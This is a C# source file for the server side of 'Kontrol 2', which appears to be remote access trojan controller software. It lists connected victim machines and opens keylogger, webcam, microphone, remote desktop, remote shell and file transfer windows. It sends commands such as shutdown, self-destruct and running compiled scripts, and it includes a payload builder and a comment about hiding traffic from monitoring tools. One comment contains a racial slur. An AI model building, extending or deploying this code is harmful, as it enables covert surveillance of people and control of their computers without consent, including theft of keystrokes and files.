using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.IO;
using Newtonsoft.Json;
using System.Globalization;
using System.Threading;
using System.Diagnostics;
using System.Runtime;

namespace Kontrol_2_Server
{
	public partial class MainForm : Form
	{
		//Server and client properties
		static Socket _SERVERSOCKET;
		const int _BUFFER_SIZE = 20971520;
		static Settings _SRVSETTINGS = null;
		static readonly byte[] _BUFFER = new byte[_BUFFER_SIZE];
		public static readonly List<Socket> _CSOCKETS = new List<Socket>();
		static List<ClientInfo> _CINFOS = new List<ClientInfo>();
		static string _APPDATA = Path.Join(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "RESoft/Kontrol 2/");

		//Form global variables
		public static FileManagerForm fmf = new FileManagerForm();
		public static ProcessForm pmf = new ProcessForm();
		public static RemoteShellForm rsf = new RemoteShellForm();
		public static RemoteCamForm rcf = new RemoteCamForm();
		public static RemoteAudioForm raf = new RemoteAudioForm();
		public static RemoteDesktopForm rdf = new RemoteDesktopForm();
		public static SendCommandForm scf = new SendCommandForm();
		public static ReKodeEditor rke = new ReKodeEditor();
		public static VisitWebsiteForm vwf = new VisitWebsiteForm();
        public static KeyLoggerForm klf = new KeyLoggerForm();

        //File operation variables
        public static byte fo_mode = 255;
		public static string fo_path = null;
		public static MemoryStream fileStream;
		public static int fo_size = 0;
		public static int fo_writeSize = 0;
		static byte[] fileBuffer = new byte[1];

		static int recievedBytes = 0;
		static int sentBytes = 0;
		PerformanceCounter cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
		PerformanceCounter ramCounter = new PerformanceCounter("Memory", "Available MBytes");
		public MainForm()
		{
			InitializeComponent();
		}

		void StartServer()
		{
			try
			{
				toolStripStatusLabel1.Text = "Status: Starting...";
				_SERVERSOCKET = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				_SERVERSOCKET.Bind(new IPEndPoint(IPAddress.Parse(_SRVSETTINGS.IpAddr), _SRVSETTINGS.Port));
				_SERVERSOCKET.Listen(5);
				_SERVERSOCKET.BeginAccept(AcceptCallBack, null);
				toolStripStatusLabel1.Text = "Status: Online";
				listUpdate.Start();
				statusUpdate.Start();
				startBtn.Text = "Stop Server";
			}
			catch (Exception ex)
			{
				MessageBox.Show($"Error: {ex.Message}", "An Error Occured", MessageBoxButtons.OK, MessageBoxIcon.Error);
			}
		}

		void StopServer()
		{
			try
			{
				_SERVERSOCKET.Close();
				listUpdate.Stop();
				ClientsView.Clear();
				statusUpdate.Stop();
				startBtn.Text = "Start Server";
			}
			catch (Exception ex)
			{
				MessageBox.Show($"Error: {ex.Message}", "An Error Occured", MessageBoxButtons.OK, MessageBoxIcon.Error);
			}
		}

		void listClients()
		{
			try
			{
				int selectedClientId = -10;
				//Had to add this cause apperantly if you execute the program alone this function gets executed on the main thread and when debugging it gets executed on the child thread.
				if (ClientsView.InvokeRequired)
				{
					ClientsView.Invoke(new MethodInvoker(delegate
					{
						if (ClientsView.SelectedIndices.Count > 0)
						{
							selectedClientId = ClientsView.SelectedIndices[0];
						}
						ClientsView.Items.Clear();
						for (int i = 0; i < _CINFOS.Count; i++)
						{
							if (_CSOCKETS[i].Connected)
							{
								string[] row = { _CINFOS[i].id.ToString(), _CINFOS[i].ip, _CINFOS[i].country, _CINFOS[i].machineName, _CINFOS[i].time, _CINFOS[i].os, _CINFOS[i].username, _CINFOS[i].hwid, _CINFOS[i].version, _CINFOS[i].privilege, _CINFOS[i].activeWindow };
								ListViewItem lv = new ListViewItem(row);
								switch (_CINFOS[i].privilege.ToLower())
								{
									case "user":
										lv.ImageIndex = 8;
										break;
									case "admin":
										lv.ImageIndex = 2;
										break;
									default:
										lv.ImageIndex = 8;
										break;
								}
								ClientsView.Items.Add(lv);
							}
							else
							{
								_CSOCKETS.RemoveAt(i);
								_CINFOS.RemoveAt(i);
							}
						}
						if (selectedClientId != -10)
						{
							ClientsView.Items[selectedClientId].Selected = true;
							ClientsView.Select();
						}
					}));
				}
				else //Main thread so no need to invoke I guess :/
				{
					if (ClientsView.SelectedIndices.Count > 0)
					{
						selectedClientId = ClientsView.SelectedIndices[0];
					}
					ClientsView.Items.Clear();
					for (int i = 0; i < _CINFOS.Count; i++)
					{
						if (_CSOCKETS[i].Connected)
						{
							string[] row = { _CINFOS[i].id.ToString(), _CINFOS[i].ip, _CINFOS[i].country, _CINFOS[i].machineName, _CINFOS[i].time, _CINFOS[i].os, _CINFOS[i].username, _CINFOS[i].hwid, _CINFOS[i].version, _CINFOS[i].privilege, _CINFOS[i].activeWindow };
							ListViewItem lv = new ListViewItem(row);
							switch (_CINFOS[i].privilege.ToLower())
							{
								case "user":
									lv.ImageIndex = 8;
									break;
								case "admin":
									lv.ImageIndex = 2;
									break;
								default:
									lv.ImageIndex = 8;
									break;
							}
							ClientsView.Items.Add(lv);
						}
						else
						{
							_CSOCKETS.RemoveAt(i);
							_CINFOS.RemoveAt(i);
						}
					}
					if (_CSOCKETS.Count > 0 && selectedClientId != -10)
					{
						ClientsView.Items[selectedClientId].Selected = true;
						ClientsView.Select();
					}
				}
			}
			catch { }
		}

		void CloseAllConnections()
		{
			foreach (Socket socket in _CSOCKETS)
			{
				socket.Shutdown(SocketShutdown.Both);
				socket.Close();
			}
			_SERVERSOCKET.Close();
		}

		void CloseConnection(int clientId)
		{
			_CSOCKETS[clientId].Shutdown(SocketShutdown.Both);
            _CSOCKETS[clientId].Close();
			_CINFOS.RemoveAt(clientId);
        }

		void AcceptCallBack(IAsyncResult ar)
		{
			Socket socket;

			try
			{
				socket = _SERVERSOCKET.EndAccept(ar);

			}
			catch (ObjectDisposedException)
			{
				return;
			}

			_CSOCKETS.Add(socket);
			int id = _CSOCKETS.Count - 1;
			SendCommand("getinfo-" + id, id);
			socket.BeginReceive(_BUFFER, 0, _BUFFER_SIZE, SocketFlags.None, RecieveCallBack, socket);
			//SendKeys.SendWait("its ok just not for everybody"); // nigga wut???
			_SERVERSOCKET.BeginAccept(AcceptCallBack, null);
		}

		void RecieveCallBack(IAsyncResult ar)
		{
			Socket current = (Socket) ar.AsyncState;
			if (!current.Connected) return;
			int recieved = 0;
			try
			{
				recieved = current.EndReceive(ar);
			}
			catch (SocketException)
			{
				current.Close();
				_CINFOS.RemoveAt(_CSOCKETS.IndexOf(current));
				_CSOCKETS.Remove(current);
			}
			byte[] recBuf = new byte[recieved];
			Array.Copy(_BUFFER, recBuf, recieved);
			current.BeginReceive(_BUFFER, 0, _BUFFER_SIZE, SocketFlags.None, RecieveCallBack, current);
			new Thread(() =>
			{
				byte[] header = new byte[2];
				Array.Copy(recBuf, header, 2);
				if (header[0] == 0xFE)
				{
					switch (header[1])
                    {
                        case 0xF1:
                            byte[] scBytes = recBuf.Skip(2).ToArray();
                            rdf.processImage(scBytes);
                            break;
                        case 0xF2:
							byte[] wcBytes = recBuf.Skip(2).ToArray();
							rcf.displayImage(wcBytes);
							break;
						case 0xF3:
							byte[] audioBytes = new byte[recBuf.Length - 2];
							Buffer.BlockCopy(recBuf, 2, audioBytes, 0, audioBytes.Length);
							raf.ProcessAudio(audioBytes);
							break;
						case 0xF4:
							string text = Encoding.ASCII.GetString(recBuf.Skip(2).ToArray());
							rsf.Append(text);
							Console.WriteLine($"CMD: {text}");
                            break;
					}
					return;
				}
				else
				{
					string resp = null;
					try
					{
						resp = Encoding.ASCII.GetString(recBuf);
						resp = Decrypt(resp);
					}
					catch { }

					if (resp.StartsWith("ERROR"))
					{
						MessageBox.Show("Client Error: " + resp.Split('\n')[1], "An error occured on the client side.", MessageBoxButtons.OK, MessageBoxIcon.Error);
					}
					else if (resp.StartsWith("conditions_scasm"))
					{
						try
						{
							string[] xsplit = resp.Split('\n').Skip(1).ToArray();
							foreach (var str in xsplit)
							{
								rke.rf.Apppend(str);
							}
						}
						catch { }
					}
					else if (resp.StartsWith("klg"))
					{
						string[] xsplit = resp.Split('\n');
						klf.AppendLog(new LogStructure(Convert.ToInt32(xsplit[1]), xsplit[2], xsplit[3]));
					}
					else if (resp.StartsWith("active_window"))
					{
						string[] xsplit = resp.Split('\n');
						ClientInfo ci = _CINFOS[int.Parse(xsplit[1])];
						ci.activeWindow = xsplit[2];
						_CINFOS[int.Parse(xsplit[1])] = ci;
						listClients();
					}
					else if (resp.StartsWith("process_info"))
					{
						pmf.setProcessInfo(resp);
					}
					else if (resp.StartsWith("dir_info#"))
					{
						string[] xsplit = resp.Split('#')[2].Split('\n');

						foreach (string entry in xsplit)
						{
							try
							{
								if (true) fmf.addFileToList(entry.Split('&')[0], entry.Split('&')[1], entry.Split('&')[2], entry.Split('&')[3], entry.Split('&')[4]);
								else
									break;
							}
							catch { }
						}
					}
					else if (resp == "dir_refresh")
					{
						fmf.refreshCurrentDirectory();
					}
					else if (resp.StartsWith("drive_infos#"))
					{
						string[] xsplit = resp.Split('#')[1].Split('\n');
						foreach (string drive in xsplit)
						{
							if (drive.Contains("&"))
							{
								fmf.addFileToList(drive.Split('&')[0], drive.Split('&')[1], "N/A", "", "drive");
							}
						}
					}
					else if (resp.StartsWith("infoback-"))
					{
						string[] xsplit = resp.Split('\n');
						int id = int.Parse(xsplit[1]);
						if (bool.Parse(xsplit[8]))
						{
							xsplit[8] = "Admin";
						}
						else
						{
							xsplit[8] = "User";
						}
						_CINFOS.Add(new ClientInfo
						{
							id = id,
							ip = _CSOCKETS[id].RemoteEndPoint.ToString().Split(':')[0],
							country = GetCountry(_CSOCKETS[id].RemoteEndPoint.ToString().Split(':')[0]),
							machineName = xsplit[2],
							time = xsplit[3],
							username = xsplit[4],
							os = xsplit[5],
							hwid = xsplit[6],
							version = xsplit[7],
							privilege = xsplit[8],
							activeWindow = xsplit[9]
						});
						listClients();
					}
					else if (resp.StartsWith("file_operation"))
					{
						switch (resp.Split('\n')[1])
						{
							case "file_beginUpload":
								try
								{
									Thread.Sleep(3000);
									fo_size = (int) new FileInfo(fo_path).Length;
									int max_buffer = 1024 * 1024 * 2;
									using (var fs = new FileStream(fo_path, FileMode.Open, FileAccess.Read))
									{
										byte[] buffer = new byte[max_buffer];
										int bytesRead = 0;
										long bytesToRead = fs.Length;
										while (bytesToRead > 0)
										{
											int n = fs.Read(buffer, 0, max_buffer);
											if (n == 0) break;
											if (n != buffer.Length)
												Array.Resize(ref buffer, n);

											Send(buffer, fmf.clientId, 0, n);

											bytesRead += n;
											bytesToRead -= n;
										}
									}
									// fo_size = SendBytes(File.ReadAllBytes(fo_path), fmf.clientId);
									GC.Collect();
									GC.WaitForPendingFinalizers();
								} 
								catch { }
								break;
							case "file_uploadFinished":
								fo_path = null;
								fo_mode = 255;
								MessageBox.Show("Uplaod finished!");
								break;
							case "file_beginDownload":
								fo_size = int.Parse(resp.Split('\n')[2]);
								fo_mode = 0;
								fo_writeSize = 0;
								fileBuffer = new byte[fo_size];
								SendCommand("file_operation\nfile_beginUpload", fmf.clientId);
								MessageBox.Show("file begin download");
								break;
							case "dfprog":
								try
								{
									fo_writeSize = int.Parse(resp.Split('\n')[2]);
									fmf.progressBarUpdate((float)fo_writeSize / (float)fo_size * 100f);
								} catch { }
								break;
						}
					}
					else if (resp.StartsWith("remote_webcam"))
					{
						string[] xsplit = resp.Split('\n');
						switch (xsplit[1])
						{
							case "devices":
								rcf.listDevices(xsplit[2]);
								break;
							case "device_resolutions":
								rcf.listResolutions(xsplit[2]);
								break;
							case "start_display":
								rcf.wcStream = true;
								break;
							case "stop_display":
								rcf.wcStream = false;
								break;
						}
					}
					else if (resp.StartsWith("remote_audio"))
					{
						string[] xsplit = resp.Split('\n');
						if (xsplit[1] == "audio_devices") raf.ListDevices(xsplit[2]);
						else raf.Init(xsplit[1][0], int.Parse(xsplit[2]), int.Parse(xsplit[3]));
					}
					else if (resp.StartsWith("remote_desktop"))
					{
						string[] xsplit = resp.Split('\n');
						switch(xsplit[1])
						{
							case "screen_res":
								rdf.screenResolution[0] = int.Parse(xsplit[2]);
								rdf.screenResolution[1] = int.Parse(xsplit[3]);
								break;
						}
					}
					else if (resp.StartsWith("display_msgbox"))
					{
						string[] xsplit = resp.Split('\n');
						MessageBox.Show(resp.Substring(resp.IndexOf("@[msg]") + 6), xsplit[1], (MessageBoxButtons) int.Parse(xsplit[2]), (MessageBoxIcon) int.Parse(xsplit[3]));
					}
					else if (fo_mode == 0)
					{
						DownloadFile(recBuf);
					}
				}
			}).Start();
			recievedBytes = recBuf.Length;
		}

		public static string Encrypt(string text)
		{
			/*string key = "D(G+KbPeSg";
			byte[] clearBytes = Encoding.ASCII.GetBytes(text);
			using (Aes encryptor = Aes.Create())
			{
				Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(key, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
				encryptor.Key = pdb.GetBytes(32);
				encryptor.IV = pdb.GetBytes(16);

				using (MemoryStream ms = new MemoryStream())
				{
					using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
					{
						cs.Write(clearBytes, 0, clearBytes.Length);
						cs.Close();
					}
					text = Convert.ToBase64String(ms.ToArray());
				}
			}*/
			return text;
		}
		public static string Decrypt(string text)
		{
			/*string key = "D(G+KbPeSg";
			byte[] cipherBytes = Convert.FromBase64String(text);
			using (Aes encryptor = Aes.Create())
			{
				Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(key, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
				encryptor.Key = pdb.GetBytes(32);
				encryptor.IV = pdb.GetBytes(16);

				using (MemoryStream ms = new MemoryStream())
				{
					using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
					{
						cs.Write(cipherBytes, 0, cipherBytes.Length);
						cs.Close();
					}
					text = Encoding.ASCII.GetString(ms.ToArray());
				}
			}*/
			return text;
		}
		public string GetCountry(string ip)
		{
			IpInfo ipInfo = new IpInfo();
			try
			{
				HttpWebRequest.DefaultWebProxy = new WebProxy(); //Hide the http request from apps like fiddler
				string info = new WebClient().DownloadString("http://ipinfo.io/" + ip);
				ipInfo = JsonConvert.DeserializeObject<IpInfo>(info);
				RegionInfo myRI1 = new RegionInfo(ipInfo.Country);
				ipInfo.Country = myRI1.EnglishName;
			}
			catch (Exception)
			{
				ipInfo.Country = "N/A";
			}

			return ipInfo.Country;
		}
		public static void SendCommand(string cmd, int targetClient, bool multi = true)
		{
			Socket s = _CSOCKETS[targetClient];
			string encrypted = Encrypt(cmd);
			byte[] sentData = Encoding.ASCII.GetBytes(encrypted);
			s.Send(sentData);
			sentBytes = sentData.Length;
		}
		public void SendAll(string cmd)
		{
			foreach (int client in ClientsView.Items)
			{
				SendCommand(cmd, client);
			}
		}
		public static int Send(byte[] data, int targetClient, int offset = 0, int size = 0)
		{
			if (size == 0) size = data.Length;
			int sent = _CSOCKETS[targetClient].Send(data, offset, size, SocketFlags.None);
			sentBytes = sent;
			return sent;
		}
		public void SendBytesAll(byte[] data)
		{
			foreach (int client in ClientsView.Items)
			{
				Send(data, client);
			}
		}
		public void DownloadFile(byte[] data)
		{
			//Console.Write($"\rRecieved: {data.Length} fo_writeSize: {fo_writeSize} fo_size: {fo_size}");
			Buffer.BlockCopy(data, 0, fileBuffer, fo_writeSize, data.Length);
			fo_writeSize += data.Length;
			if (fo_writeSize >= fo_size)
			{
				using (var fs = new FileStream(fo_path, FileMode.Create, FileAccess.Write))
				{
					fs.Write(fileBuffer, 0, fileBuffer.Length);
				}
				//fileStream.WriteTo(fs);
				//fileStream.Close();
				fo_writeSize = 0;
				fo_size = 0;
				fo_mode = 255;
				fmf.progressBarUpdate(0);
				Array.Clear(fileBuffer, 0, fileBuffer.Length);
				SendCommand("file_operation\nfile_uploadFinished", fmf.clientId);
				MessageBox.Show("download finished");
			}
			else
				fmf.progressBarUpdate((float) fo_writeSize / (float) fo_size * 100f);
		}
		public void StreamDownload(int clientId)
		{
			NetworkStream ns = new NetworkStream(_CSOCKETS[fmf.clientId]);
			using (FileStream fs = new FileStream(fo_path, FileMode.Create, FileAccess.Write))
			{
				int count = 0;
				byte[] data = new byte[1024 * 8];  //8Kb buffer .. you might use a smaller size also.
				SendCommand("file_operation\nfile_beginUpload", fmf.clientId);
				MessageBox.Show("file begin download");
				while (fo_writeSize < fo_size)
				{
					if (true)
					{
						count = ns.Read(data, 0, data.Length);
						fs.Write(data, 0, count);
						fo_writeSize += count;
						ClientsView.Invoke(new MethodInvoker(delegate 
						{
							this.Text = "fo_writeSize: " + fo_writeSize.ToString();
						}));
					}
				}
				fo_writeSize = 0;
				fo_size = 0;
				SendCommand("remote_desktop\nfile_uploadFinished", fmf.clientId);
				MessageBox.Show("download finished");

			}
		}
		bool SaveSettings()
		{
			string cfgFile = Path.Join(_APPDATA, "config.json");
			try
			{
				if (!Directory.Exists(_APPDATA)) Directory.CreateDirectory(_APPDATA);
				File.WriteAllText(cfgFile, JsonConvert.SerializeObject(_SRVSETTINGS));
			}
			catch (Exception ex)
			{
				MessageBox.Show($"Error: Could not save settings @ {cfgFile}.", "An Error Occured", MessageBoxButtons.OK, MessageBoxIcon.Error);
				return false;
			}
			return true;
		}
		bool LoadSettings()
		{
			string cfgFile = Path.Join(_APPDATA, "config.json");
			if (File.Exists(cfgFile))
			{
				_SRVSETTINGS = JsonConvert.DeserializeObject<Settings>(File.ReadAllText(cfgFile));
				addrBox.Text = _SRVSETTINGS.IpAddr;
				portBox.Text = _SRVSETTINGS.Port.ToString();
				return true;
			}
			return false;
		}
		void MainForm_Shown(object sender, EventArgs e)
		{
			if (!LoadSettings())
				MessageBox.Show("Please configure Kontrol 2 in the Settings tab and Start the server.", "No configuration found", MessageBoxButtons.OK, MessageBoxIcon.Information);
			else
			{
				StartServer();
				statusUpdate.Start();
			}
		}
		void listUpdate_Tick(object sender, EventArgs e)
		{
			listClients();
		}
		void microsoftTextToSpeechToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				T2SForm t2sform = new T2SForm();
				t2sform.clientId = ClientsView.SelectedIndices[0];
				t2sform.Show();
			}
		}
		void sendMessageBoxToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				int clientIndex = ClientsView.SelectedIndices[0];
				MsgBoxForm msgform = new MsgBoxForm();
				msgform.clientId = clientIndex;
				msgform.Show();
			}
		}
		void playSinewaveFrequencyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				FrequencyForm freqForm = new FrequencyForm();
				freqForm.clientId = ClientsView.SelectedIndices[0];
				freqForm.Show();
			}
		}
		void playSystemSoundToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				SoundForm soundForm = new SoundForm();
				soundForm.clientId = ClientsView.SelectedIndices[0];
				soundForm.Show();
			}
		}
		void proccessManagerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				pmf.clientId = ClientsView.SelectedIndices[0];
				pmf.Show();
			}

		}
		void hideWindowsElementsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				HideElementsForm hef = new HideElementsForm();
				hef.clientId = ClientsView.SelectedIndices[0];
				hef.Show();
			}
		}
		void remoteShellToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				rsf.clientId = ClientsView.SelectedIndices[0];
				rsf.Show();
			}
		}
		void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				fmf.clientId = ClientsView.SelectedIndices[0];
				fmf.username = _CINFOS[ClientsView.SelectedIndices[0]].machineName;
				fmf.Show();
			}
		}
		void statusUpdate_Tick(object sender, EventArgs e)
		{
			if (this.InvokeRequired)
			{
				statusStrip1.Invoke(new MethodInvoker(delegate
				{
					statusSentLabel.Text = "Sent: " + sentBytes + "B";
					statusRecievedLabel.Text = "Recieved: " + recievedBytes + "B";
					statusRAMLabel.Text = "RAM: " + ramCounter.NextValue() + "MB";
					statusCPULabel.Text = "CPU: " + (int)cpuCounter.NextValue() + "%";
				}));
			}
			else
			{
				statusSentLabel.Text = "Sent: " + sentBytes + "B";
				statusRecievedLabel.Text = "Recieved: " + recievedBytes + "B";
				statusRAMLabel.Text = "RAM: " + ramCounter.NextValue() + "MB";
				statusCPULabel.Text = "CPU: " + (int)cpuCounter.NextValue() + "%";
			}
		}

		void MainForm_FormClosing(object sender, FormClosingEventArgs e)
		{
			//e.Cancel = true;
			//this.Hide();
		}
		void remoteWebcamToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				rcf.clientId = ClientsView.SelectedIndices[0];
				rcf.Show();
			}
		}
		void remoteAudioToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				raf.clientId = ClientsView.SelectedIndices[0];
				raf.Show();
			}
		}
		void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				rdf.clientId = ClientsView.SelectedIndices[0];
				rdf.Show();
			}
		}

		void exitToolStripMenuItem_Click(object sender, EventArgs e)
		{
			CloseAllConnections();
			Environment.Exit(0);
		}

		void showToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.Show();
		}

		void exitToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				SendCommand("conditions_exit", ClientsView.SelectedIndices[0]);
			}
		}

		void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				SendCommand("system_shutdown", ClientsView.SelectedIndices[0]);
			}
		}

		void sleepToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				SendCommand("system_sleep", ClientsView.SelectedIndices[0]);
			}
		}

		void restartToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				SendCommand("system_restart", ClientsView.SelectedIndices[0]);
			}
		}

		void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				SendCommand("conditions_selfDestruct", ClientsView.SelectedIndices[0]);
			}
		}

		void showLocationToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				SendCommand("conditions_showSelf", ClientsView.SelectedIndices[0]);
			}
		}

		void sendCommandToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				scf.clientId = ClientsView.SelectedIndices[0];
				scf.Show();
			}
		}

		void chatToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{

			}
		}

		void compileCScriptToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				rke.clientId = ClientsView.SelectedIndices[0];
				rke.Show();
			}
		}

		void reloadToolStripMenuItem_Click(object sender, EventArgs e)
		{
            if (ClientsView.SelectedIndices.Count > 0)
            {
                SendCommand("conditions_reload", ClientsView.SelectedIndices[0]);
            }
        }

		void visitWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
		{
            if (ClientsView.SelectedIndices.Count > 0)
            {
                vwf.clientId = ClientsView.SelectedIndices[0];
                vwf.Show();
            }
        }

		void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (ClientsView.SelectedIndices.Count > 0)
			{
				klf.clientId = ClientsView.SelectedIndices[0];
                klf.Show();
			}
		}

		void builderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			new BuilderForm().Show();
		}

		void startBtn_Click(object sender, EventArgs e)
		{
			if (startBtn.Text == "Start Server")
			{
				_SRVSETTINGS = new Settings();
				_SRVSETTINGS.IpAddr = addrBox.Text;
				_SRVSETTINGS.Port = ushort.Parse(portBox.Text);
				SaveSettings();
				StartServer();
			}
			else
			{
				StopServer();
				startBtn.Text = "Start Server";
			}
		}
	}

	public class Settings
	{
		public string IpAddr { get; set; }
		public ushort Port { get; set; }
	}

	public struct ClientInfo
	{
		public int id { get; set; }
		public string ip { get; set; }
		public string country { get; set; }
		public string machineName { get; set; }
		public string time { get; set; }
		public string os { get; set; }
		public string username { get; set; }
		public string hwid { get; set; }
		public string version { get; set; }
		public string privilege { get; set; }
		public string activeWindow { get; set; }
	}

	public struct IpInfo
	{
		[JsonProperty("ip")]
		public string Ip { get; set; }

		[JsonProperty("hostname")]
		public string Hostname { get; set; }

		[JsonProperty("city")]
		public string City { get; set; }

		[JsonProperty("region")]
		public string Region { get; set; }

		[JsonProperty("country")]
		public string Country { get; set; }

		[JsonProperty("loc")]
		public string Loc { get; set; }

		[JsonProperty("org")]
		public string Org { get; set; }

		[JsonProperty("postal")]
		public string Postal { get; set; }
	}
}
